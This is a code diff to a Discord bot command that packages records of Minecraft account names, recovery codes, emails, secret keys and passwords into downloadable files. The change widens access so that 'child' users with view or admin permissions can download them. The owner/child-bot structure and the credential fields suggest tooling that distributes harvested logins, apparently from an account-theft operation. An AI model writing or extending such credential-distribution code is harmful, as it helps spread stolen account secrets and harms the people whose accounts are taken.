@@ -23,23 +23,32 @@ module.exports = {
 
             if (parts.length >= 10) {
                 [, ownerId, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
-                const isUserOwner = await isOwner(interaction.user.id);
-                if (ownerId && interaction.user.id !== ownerId && !isUserOwner) {
-                    return interaction.reply({
-                        content: "You are not authorized to download these credentials.",
-                        ephemeral: true,
-                    });
-                }
             } else {
                 [, newName, mc, capes, recoveryCode, email, secEmail, secretkey, password] = parts;
-                const isUserOwner = await isOwner(interaction.user.id);
-                const isChildBotOwner = client.username && client.username === interaction.user.id;
-                if (!isUserOwner && !isChildBotOwner) {
-                    return interaction.reply({
-                        content: "You are not authorized to download these credentials.",
-                        ephemeral: true,
-                    });
+            }
+
+            const isUserOwner = await isOwner(interaction.user.id);
+            const isChildBotOwner = client.username && client.username === interaction.user.id;
+            let isAuthorized = isUserOwner || isChildBotOwner || (ownerId && interaction.user.id === ownerId);
+
+            if (!isAuthorized) {
+                const targetOwner = ownerId || client.username;
+                if (targetOwner) {
+                    const childPerm = await queryParams(
+                        "SELECT viewaccounts, admin FROM users WHERE user_id = ? AND child = ?",
+                        [targetOwner, interaction.user.id]
+                    );
+                    if (childPerm && childPerm.length > 0 && (childPerm[0].viewaccounts === 1 || childPerm[0].admin === 1)) {
+                        isAuthorized = true;
+                    }
                 }
+            }
+
+            if (!isAuthorized) {
+                return interaction.reply({
+                    content: "You are not authorized to download these credentials.",
+                    ephemeral: true,
+                });
             }
 
             const fileContent =
